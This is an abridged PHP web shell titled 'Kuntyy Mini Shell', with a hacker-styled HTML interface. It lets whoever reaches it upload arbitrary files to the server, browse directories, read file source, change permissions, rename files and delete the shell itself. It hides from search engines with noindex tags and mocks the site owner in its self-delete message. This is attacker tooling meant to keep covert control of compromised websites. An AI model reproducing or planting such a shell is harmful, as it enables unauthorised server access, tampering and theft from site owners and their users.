...
// Specialized 4 403
	...
	echo "
		...
		<html onclick=\"lumm7\">
			<head>
				<link rel=\"shortcut icon\" href=\"https://i.ibb.co/tmYj2V1/lummaxech77.png\" />
		        <meta name=\"ROBOTS\"       content=\"NOINDEX, NOFOLLOW, NOARCHIVE\" />
		        <meta name=\"GOOGLEBOT\"    content=\"NOINDEX, NOFOLLOW, NOARCHIVE\" />
		        <meta charset=\"UTF-8\">
		        <script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"></script>
				<link href='http://fonts.googleapis.com/css?family=Monoton' rel='stylesheet' type='text/css'>
		        <title>Lumm77@$web</title>
		        <style>
		        ...
		        *, body, html { text-shadow: 0px 0px 1px #141414; cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur863.ani), url(http://cur.cursors-4u.net/cursors/cur-9/cur863.png), default !important;}
		        ...
		        #details{ -moz-border-radius: 10px; border-radius: 5px; border:1px solid green; padding:4px 8px; line-height:30px; background:#111111; color:#aaa; margin:0 0 8px 0; min-height:100px; margin-top: 10px;}
		        tr:hover { background: green;}
		        a:hover { text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none; }
		        .lamesa, .mesa { width:100%; padding:4px 0; color:white; font-size:20px;}
			...
			<body>
			    <audio id=\"audio\" autoplay=\"autoplay\" src=\"https://a.top4top.io/m_1999jp5x10.mp3\" loop></audio> 
<script>function lumm7(){
       var audio = document.getElementById(\"audio\");
       audio.play();
                 }</script>
				<center><div class=\"board\" style=\"width: 100%;\"><p id=\"spade\">Kuntyy</p><p id=\"pirates\">Mini Shell</p></div></center>
				<div id='details'>
				<table class=\"lamesa\" cellpadding=\"3\" cellspacing\"1\">
					...
					<tr>
						...
						if(isset($_FILES['file'])){
							if(@copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
								echo "<font color=red><a href=".sanitize($_FILES['file']['name'])." target='_blank'>File Uploaded!</font><br/>";
							}else{
								echo "<font color=red>File Not Uploaded!</font><br/>";
							}//upload
						}//file
						echo "
							<form method=POST enctype=\"multipart/form-data\"><font class=\"titulo wala\">==========================================================<br><label for=\"upload\"><img class=\"piktur\" src=\"https://i.ibb.co/tmYj2V1/lummaxech77.png\"><input id=\"upload\" class=\"chekwa\" type=\"file\" name=\"file\"></label><br>==========================================================<br><input type=\"submit\" class=\"submit\" ";
							if(!is_writable($path)){echo "disabled value='Not Writable!' style='background: red;'";}else{ echo "value='Upload!'"; }
							echo "
							><br><br><hr></form>
						</td>
					</tr><hr><tr><td class=\"wala\">[<a href=".sanitize($_SERVER['PHP_SELF']).">Home</a>]&nbsp;[<a href='?details'>System Details</a>]&nbsp;[<a href='?kill'>Kill Me</a>]</td></tr></table></div><table>";
						if(isset($_GET['details'])){
							...
							$akez = basename($me);
							if(unlink($akez)){
								echo "<script>alert('Sayonara Suckers .|.')</script><meta http-equiv=\"refresh\" content=\"0; URL=https://x-ploitech.blogspot.com\">";
							...
							if($_POST['opt'] == 'chmod'){
								...
								echo "<form method=POST><font class=\"titulo\">Permission:~$&nbsp;</font><input type=\"text\" class=\"titulo\" name=\"perm\" size=\"4\" value='".substr(sprintf('%o', fileperms($_POST['path'])), -4)."'><input type=\"hidden\" name=\"path\" value='".$_POST['path']."'><input type=\"hidden\" name=\"opt\" value=\"chmod\"><input type=\"submit\" class=\"submit\" value=\">>\"></form>";
								...
								echo "<form method=POST><font class=\"titulo\">New Name:~$  &nbsp;</font><input name= \"newname\" class=\"titulo\" type=\"text\" size=\"20\" value='".sanitize($_POST['name'])."'><input type=\"hidden\" name=\"path\" value='".sanitize($_POST['path'])."'><input type=\"hidden\" name=\"opt\" value=\"rename\"><input type=\"submit\" class=\"submit\" value=\">>\"></form>";
							...
							<div class=\"content\" id=\"details\">
								<table class=\"lamesa\" cellpadding=\"3\" cellspacing=\"7\">
									<tr>
										<th><font class=\"titulo\">Name</font><hr></th>
										<th><font class=\"titulo\">Size</font><hr></th>
										<th><font class=\"titulo\">Permissions</font><hr></th>
										<th><font class=\"titulo\">Options</font><hr></th>
									</tr>";
										foreach($scandir as $dir){
											if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
											echo "
											<tr>
												<td style=\"text-align:left\"><a href=\"?path=".$path."/".$dir."\">".$dir."</a></td>
												<td><center>~</center></td>
												<td><center>";
									...
									<tr>
										...
										foreach($scandir as $file){
											if(!is_file($path.'/'.$file)) continue;//is_file
												...
												echo "
												<tr>
													<td style=\"text-align:left\"><a href=\"?filesource=".$path."/".$file."&path=".$path."\">".$file."</a></td>
					...
					echo "
						...
						<div class='foot'>
					<hr width='80%'>
					<footer>&copy; <font color=lime class=titulo>Lummaxech77</font> ".date('Y')."</footer>
				</div>
			</body>
		</html>";
function perms($file){
